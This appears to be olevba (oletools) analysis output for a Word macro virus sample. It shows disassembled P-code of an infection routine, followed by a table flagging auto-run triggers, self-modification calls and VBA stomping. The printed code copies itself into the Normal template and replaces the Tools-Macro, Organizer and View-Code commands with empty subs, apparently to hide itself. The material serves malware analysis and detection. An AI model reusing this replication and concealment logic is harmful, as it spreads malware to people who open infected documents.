' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #193:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #194:
' 	LitVarSpecial (False)
' 	St already 
' Line #195:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #196:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #197:
' 	Ld aprj 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #198:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #200:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #201:
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #202:
' 	SetStmt 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #203:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #204:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #205:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #206:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #207:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	Label Phuck 
' Line #210:
' 	EndSub 
' Line #211:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

